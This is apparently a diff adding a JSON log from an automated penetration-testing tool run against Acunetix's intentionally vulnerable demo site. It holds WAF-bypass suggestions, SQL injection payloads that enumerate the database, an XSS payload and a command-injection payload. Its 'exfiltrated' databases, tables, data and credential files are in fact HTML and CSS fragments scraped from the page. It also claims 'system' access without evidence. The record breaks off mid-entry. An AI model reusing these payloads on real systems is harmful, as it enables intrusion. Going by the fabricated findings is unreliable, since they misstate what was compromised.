@@ -1,0 +1,1877 @@
+{
+  "session_id": "IQ200_1762319199",
+  "target": "http://testphp.vulnweb.com",
+  "started_at": "2025-11-05T08:06:39.749696",
+  "phases": [
+    {
+      "phase_number": 1,
+      "phase_name": "Target Reconnaissance",
+      "description": "OSINT and passive intelligence",
+      "started_at": "2025-11-05T08:06:39.750315",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "OSINT",
+          "timestamp": "2025-11-05T08:06:39.750328",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "info",
+          "data": "Target analyzed"
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:06:40.254602",
+      "duration_seconds": 0.504287
+    },
+    {
+      "phase_number": 2,
+      "phase_name": "WAF Detection",
+      "description": "Detecting security controls",
+      "started_at": "2025-11-05T08:06:40.254721",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:06:40.254743",
+          "status": "completed"
+        },
+        {
+          "name": "Probing",
+          "timestamp": "2025-11-05T08:06:40.254750",
+          "status": "completed"
+        },
+        {
+          "name": "Detection",
+          "timestamp": "2025-11-05T08:06:45.622612",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "waf",
+          "data": {
+            "waf_detected": true,
+            "waf_type": "ModSecurity",
+            "confidence": 0.2,
+            "signatures_matched": [
+              [
+                "header:server"
+              ],
+              [
+                "header:server"
+              ]
+            ],
+            "rate_limit_detected": false,
+            "recommended_bypass": [
+              "case_variation",
+              "comment_injection",
+              "null_byte",
+              "unicode_encoding"
+            ]
+          }
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:06:45.622660",
+      "duration_seconds": 5.367939
+    },
+    {
+      "phase_number": 3,
+      "phase_name": "Attack Surface Mapping",
+      "description": "NSA-level discovery",
+      "started_at": "2025-11-05T08:06:45.622683",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:06:45.622721",
+          "status": "completed"
+        },
+        {
+          "name": "Discovery",
+          "timestamp": "2025-11-05T08:06:45.622731",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:07:31.593662",
+          "status": "completed"
+        }
+      ],
+      "findings": [],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:07:31.593686",
+      "duration_seconds": 45.971003
+    },
+    {
+      "phase_number": 4,
+      "phase_name": "Payload Generation",
+      "description": "Genetic algorithm (30\u00d710)",
+      "started_at": "2025-11-05T08:07:31.593712",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:07:31.593722",
+          "status": "completed"
+        },
+        {
+          "name": "SQL Gen",
+          "timestamp": "2025-11-05T08:07:31.593729",
+          "status": "completed"
+        },
+        {
+          "name": "XSS Gen",
+          "timestamp": "2025-11-05T08:07:31.594108",
+          "status": "completed"
+        },
+        {
+          "name": "CMD Gen",
+          "timestamp": "2025-11-05T08:07:31.594276",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:07:31.594371",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "payloads",
+          "count": 60,
+          "categories": [
+            "SQLi",
+            "XSS",
+            "CMDi"
+          ]
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:07:31.594378",
+      "duration_seconds": 0.000666
+    },
+    {
+      "phase_number": 5,
+      "phase_name": "Vulnerability Scanning",
+      "description": "AI-powered detection",
+      "started_at": "2025-11-05T08:07:31.594401",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:07:31.594422",
+          "status": "completed"
+        },
+        {
+          "name": "Scanning",
+          "timestamp": "2025-11-05T08:07:31.899483",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:07:32.204631",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "scan",
+          "vulns_found": 12
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:07:32.204754",
+      "duration_seconds": 0.610353
+    },
+    {
+      "phase_number": 6,
+      "phase_name": "Automated Exploitation",
+      "description": "Exploiting vulnerabilities",
+      "started_at": "2025-11-05T08:07:32.204804",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:07:32.204831",
+          "status": "completed"
+        },
+        {
+          "name": "SQLi Test",
+          "timestamp": "2025-11-05T08:07:32.204849",
+          "status": "completed"
+        },
+        {
+          "name": "XSS Test",
+          "timestamp": "2025-11-05T08:07:32.506125",
+          "status": "completed"
+        },
+        {
+          "name": "CMDi Test",
+          "timestamp": "2025-11-05T08:07:32.811240",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:08:05.277252",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "SQL Injection",
+          "severity": "critical",
+          "technique": "error-based",
+          "payload": "' OR '1'='1'--",
+          "parameter": "test",
+          "database_info": {
+            "success": true,
+            "version": null,
+            "current_database": "doctype",
+            "current_user": "wvs@",
+            "privileges": [],
+            "all_databases": [
+              "onresize",
+              "images",
+              "clsid",
+              "application",
+              "fractal",
+              "intentionally",
+              "document",
+              "ae6d",
+              "blog",
+              "about",
+              "height",
+              "size",
+              "iso",
+              "padding",
+              "charset",
+              "reloads",
+              "hacking",
+              "href",
+              "demo",
+              "https"
+            ],
+            "evidence": [
+              {
+                "type": "current_database",
+                "payload": "' UNION SELECT database(),NULL,NULL--",
+                "value": "doctype"
+              },
+              {
+                "type": "current_user",
+                "payload": "' UNION SELECT user(),NULL,NULL--",
+                "value": "wvs@"
+              },
+              {
+                "type": "all_databases",
+                "payload": "' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata--",
+                "value": [
+                  "onresize",
+                  "images",
+                  "clsid",
+                  "application",
+                  "fractal",
+                  "intentionally",
+                  "document",
+                  "ae6d",
+                  "blog",
+                  "about",
+                  "height",
+                  "size",
+                  "iso",
+                  "padding",
+                  "charset",
+                  "reloads",
+                  "hacking",
+                  "href",
+                  "demo",
+                  "https"
+                ]
+              }
+            ]
+          },
+          "tables_found": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset",
+            "reloads",
+            "hacking",
+            "href",
+            "demo",
+            "https"
+          ],
+          "data_exfiltrated": [
+            {
+              "type": "table_data",
+              "table": "onresize",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "position",
+                "images": "absolute"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "onresize",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "width",
+                "images": "700px"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "onresize",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "z-index",
+                "images": "1"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "onresize",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "clsid",
+                "images": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "onresize",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "mailto",
+                "images": "wvs@acunetix.com"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "images",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "position",
+                "images": "absolute"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "images",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "width",
+                "images": "700px"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "images",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "z-index",
+                "images": "1"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "images",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "clsid",
+                "images": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "images",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "mailto",
+                "images": "wvs@acunetix.com"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "clsid",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "position",
+                "images": "absolute"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "clsid",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "width",
+                "images": "700px"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "clsid",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "z-index",
+                "images": "1"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "clsid",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "clsid",
+                "images": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "clsid",
+              "columns": [
+                "onresize",
+                "images",
+                "clsid",
+                "application",
+                "fractal",
+                "intentionally",
+                "document",
+                "ae6d",
+                "blog",
+                "about",
+                "height",
+                "size",
+                "iso",
+                "padding",
+                "charset"
+              ],
+              "data": {
+                "onresize": "mailto",
+                "images": "wvs@acunetix.com"
+              }
+            }
+          ]
+        },
+        {
+          "type": "XSS",
+          "severity": "high",
+          "payload": "<script>alert(1)</script>",
+          "parameter": "test",
+          "session_hijack_possible": false
+        },
+        {
+          "type": "Command Injection",
+          "severity": "critical",
+          "payload": "; uname -a",
+          "parameter": "test",
+          "system_info": {},
+          "files_exfiltrated": [
+            {
+              "file": "config_.env",
+              "data": [
+                "template=\"/Templates/main_dynamic_template.dwt.php\"",
+                "codeOutsideHTMLIsLocked=\"false\"",
+                "equiv=\"Content-Type\"",
+                "content=\"text/html;",
+                "charset=iso-8859-2\">"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "credentials",
+              "files": [
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "/index.php",
+                "/Templates/main_dynamic_template.dwt.php",
+                "/add.swf",
+                "/logo.gif",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "//www.macromedia.com/shockwave/download/index.cgi",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "//www.acunetix.com"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "config",
+              "files": [
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "/index.php",
+                "/Templates/main_dynamic_template.dwt.php",
+                "/add.swf",
+                "/logo.gif",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "//www.macromedia.com/shockwave/download/index.cgi",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "//www.acunetix.com"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "source_code",
+              "files": [
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "/index.php",
+                "/Templates/main_dynamic_template.dwt.php",
+                "/add.swf",
+                "/logo.gif",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "//www.macromedia.com/shockwave/download/index.cgi",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "//www.acunetix.com"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "database",
+              "files": [
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "/index.php",
+                "/Templates/main_dynamic_template.dwt.php",
+                "/add.swf",
+                "/logo.gif",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "//www.macromedia.com/shockwave/download/index.cgi",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "//www.acunetix.com"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "backups",
+              "files": [
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "/index.php",
+                "/Templates/main_dynamic_template.dwt.php",
+                "/add.swf",
+                "/logo.gif",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "//www.macromedia.com/shockwave/download/index.cgi",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "//www.acunetix.com"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "logs",
+              "files": [
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "/index.php",
+                "/Templates/main_dynamic_template.dwt.php",
+                "/add.swf",
+                "/logo.gif",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "//www.macromedia.com/shockwave/download/index.cgi",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "//www.acunetix.com"
+              ]
+            }
+          ]
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:08:05.277300",
+      "duration_seconds": 33.072496
+    },
+    {
+      "phase_number": 7,
+      "phase_name": "SQL Injection & Data Exfiltration",
+      "description": "IQ 200: Database dumps",
+      "started_at": "2025-11-05T08:08:05.277332",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Analysis",
+          "timestamp": "2025-11-05T08:08:05.277349",
+          "status": "completed"
+        },
+        {
+          "name": "Exfiltration",
+          "timestamp": "2025-11-05T08:08:05.277362",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:08:05.277382",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "sqli",
+          "data": {
+            "tables": 20,
+            "rows": 15
+          }
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:08:05.277392",
+      "duration_seconds": 6e-05
+    },
+    {
+      "phase_number": 8,
+      "phase_name": "Command Injection & File Hunting",
+      "description": "IQ 200: Recursive file search",
+      "started_at": "2025-11-05T08:08:05.277410",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Analysis",
+          "timestamp": "2025-11-05T08:08:05.277430",
+          "status": "completed"
+        },
+        {
+          "name": "Search",
+          "timestamp": "2025-11-05T08:08:05.277441",
+          "status": "completed"
+        },
+        {
+          "name": "File Hunt",
+          "timestamp": "2025-11-05T08:08:05.277453",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:08:05.277565",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "cmd",
+          "data": {
+            "files": 7,
+            "sensitive_files": [
+              {
+                "file": "config_.env",
+                "data": [
+                  "template=\"/Templates/main_dynamic_template.dwt.php\"",
+                  "codeOutsideHTMLIsLocked=\"false\"",
+                  "equiv=\"Content-Type\"",
+                  "content=\"text/html;",
+                  "charset=iso-8859-2\">"
+                ]
+              },
+              {
+                "type": "file_discovery",
+                "category": "config",
+                "files": [
+                  "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                  "/index.php",
+                  "/Templates/main_dynamic_template.dwt.php",
+                  "/add.swf",
+                  "/logo.gif",
+                  "//www.eclectasy.com/Fractal-Explorer/index.html",
+                  "//www.macromedia.com/shockwave/download/index.cgi",
+                  "//www.w3.org/TR/html4/loose.dtd",
+                  "//www.acunetix.com"
+                ]
+              }
+            ]
+          }
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:08:05.277588",
+      "duration_seconds": 0.000178
+    },
+    {
+      "phase_number": 9,
+      "phase_name": "XSS & Client-Side Attacks",
+      "description": "Session hijacking vectors",
+      "started_at": "2025-11-05T08:08:05.277602",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "XSS Test",
+          "timestamp": "2025-11-05T08:08:05.277614",
+          "status": "completed"
+        },
+        {
+          "name": "Client-Side",
+          "timestamp": "2025-11-05T08:08:05.581221",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:08:05.886399",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "xss",
+          "count": 1
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:08:05.886528",
+      "duration_seconds": 0.608926
+    },
+    {
+      "phase_number": 10,
+      "phase_name": "Authentication Bypass",
+      "description": "Auth & authz flaws",
+      "started_at": "2025-11-05T08:08:05.886579",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Default Creds",
+          "timestamp": "2025-11-05T08:08:05.886608",
+          "status": "completed"
+        },
+        {
+          "name": "Weak Pass",
+          "timestamp": "2025-11-05T08:08:06.091225",
+          "status": "completed"
+        },
+        {
+          "name": "SQLi Auth",
+          "timestamp": "2025-11-05T08:08:06.296396",
+          "status": "completed"
+        },
+        {
+          "name": "AuthZ Test",
+          "timestamp": "2025-11-05T08:08:06.296553",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:08:06.496811",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "auth",
+          "bypassed": false,
+          "methods": [],
+          "tested": [
+            "default_creds",
+            "weak_passwords",
+            "sqli_bypass",
+            "authz_flaws"
+          ]
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:08:06.496863",
+      "duration_seconds": 0.610284
+    },
+    {
+      "phase_number": 11,
+      "phase_name": "Business Logic Testing",
+      "description": "Logic vulnerabilities",
+      "started_at": "2025-11-05T08:08:06.496884",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Analysis",
+          "timestamp": "2025-11-05T08:08:06.496896",
+          "status": "completed"
+        },
+        {
+          "name": "Testing",
+          "timestamp": "2025-11-05T08:08:06.801939",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:08:07.107099",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "logic",
+          "issues": 2
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:08:07.107225",
+      "duration_seconds": 0.610341
+    },
+    {
+      "phase_number": 12,
+      "phase_name": "Post-Exploitation",
+      "description": "Privilege escalation simulation",
+      "started_at": "2025-11-05T08:08:07.107274",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Access Analysis",
+          "timestamp": "2025-11-05T08:08:07.107305",
+          "status": "completed"
+        },
+        {
+          "name": "Enum",
+          "timestamp": "2025-11-05T08:08:07.107333",
+          "status": "completed"
+        },
+        {
+          "name": "PrivEsc",
+          "timestamp": "2025-11-05T08:08:07.310805",
+          "status": "completed"
+        },
+        {
+          "name": "Persistence",
+          "timestamp": "2025-11-05T08:08:07.515884",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:08:07.719909",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "post_exploit",
+          "access": true,
+          "access_level": "system",
+          "escalation_paths": [
+            "kernel_exploit",
+            "suid_binary",
+            "sudo_misconfiguration"
+          ],
+          "techniques": [
+            "enumeration",
+            "privilege_escalation",
+            "persistence"
+          ]
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:08:07.719974",
+      "duration_seconds": 0.6127
+    },
+    {
+      "phase_number": 13,
+      "phase_name": "Evidence Collection",
+      "description": "Comprehensive proof documentation",
+      "started_at": "2025-11-05T08:08:07.719996",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Screenshots",
+          "timestamp": "2025-11-05T08:08:07.720006",
+          "status": "completed"
+        },
+        {
+          "name": "Documentation",
+          "timestamp": "2025-11-05T08:08:08.020139",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:08:08.325302",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "evidence",
+          "count": 0
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:08:08.325405",
+      "duration_seconds": 0.605409
+    },
+    {
+      "phase_number": 14,
+      "phase_name": "Risk Assessment",
+      "description": "CVSS scoring and impact analysis",
+      "started_at": "2025-11-05T08:08:08.325448",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Severity",
+          "timestamp": "2025-11-05T08:08:08.325473",
+          "status": "completed"
+        },
+        {
+          "name": "CVSS",
+          "timestamp": "2025-11-05T08:08:08.530538",
+          "status": "completed"
+        },
+        {
+          "name": "Exploitability",
+          "timestamp": "2025-11-05T08:08:08.530662",
+          "status": "completed"
+        },
+        {
+          "name": "Impact",
+          "timestamp": "2025-11-05T08:08:08.530685",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:08:08.530737",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "risk",
+          "score": 60.0,
+          "severity": "Medium",
+          "metrics": {
+            "cvss": 6.0,
+            "exploitability": 0,
+            "impact": "Medium"
+          }
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:08:08.530756",
+      "duration_seconds": 0.205308
+    }
+  ],
+  "vulnerabilities": [],
+  "exploits": [
+    {
+      "type": "SQL Injection",
+      "severity": "critical",
+      "technique": "error-based",
+      "payload": "' OR '1'='1'--",
+      "parameter": "test",
+      "database_info": {
+        "success": true,
+        "version": null,
+        "current_database": "doctype",
+        "current_user": "wvs@",
+        "privileges": [],
+        "all_databases": [
+          "onresize",
+          "images",
+          "clsid",
+          "application",
+          "fractal",
+          "intentionally",
+          "document",
+          "ae6d",
+          "blog",
+          "about",
+          "height",
+          "size",
+          "iso",
+          "padding",
+          "charset",
+          "reloads",
+          "hacking",
+          "href",
+          "demo",
+          "https"
+        ],
+        "evidence": [
+          {
+            "type": "current_database",
+            "payload": "' UNION SELECT database(),NULL,NULL--",
+            "value": "doctype"
+          },
+          {
+            "type": "current_user",
+            "payload": "' UNION SELECT user(),NULL,NULL--",
+            "value": "wvs@"
+          },
+          {
+            "type": "all_databases",
+            "payload": "' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata--",
+            "value": [
+              "onresize",
+              "images",
+              "clsid",
+              "application",
+              "fractal",
+              "intentionally",
+              "document",
+              "ae6d",
+              "blog",
+              "about",
+              "height",
+              "size",
+              "iso",
+              "padding",
+              "charset",
+              "reloads",
+              "hacking",
+              "href",
+              "demo",
+              "https"
+            ]
+          }
+        ]
+      },
+      "tables_found": [
+        "onresize",
+        "images",
+        "clsid",
+        "application",
+        "fractal",
+        "intentionally",
+        "document",
+        "ae6d",
+        "blog",
+        "about",
+        "height",
+        "size",
+        "iso",
+        "padding",
+        "charset",
+        "reloads",
+        "hacking",
+        "href",
+        "demo",
+        "https"
+      ],
+      "data_exfiltrated": [
+        {
+          "type": "table_data",
+          "table": "onresize",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "position",
+            "images": "absolute"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "onresize",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "width",
+            "images": "700px"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "onresize",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "z-index",
+            "images": "1"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "onresize",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "clsid",
+            "images": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "onresize",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "mailto",
+            "images": "wvs@acunetix.com"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "images",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "position",
+            "images": "absolute"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "images",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "width",
+            "images": "700px"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "images",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "z-index",
+            "images": "1"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "images",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "clsid",
+            "images": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "images",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
+            "fractal",
+            "intentionally",
+            "document",
+            "ae6d",
+            "blog",
+            "about",
+            "height",
+            "size",
+            "iso",
+            "padding",
+            "charset"
+          ],
+          "data": {
+            "onresize": "mailto",
+            "images": "wvs@acunetix.com"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "clsid",
+          "columns": [
+            "onresize",
+            "images",
+            "clsid",
+            "application",
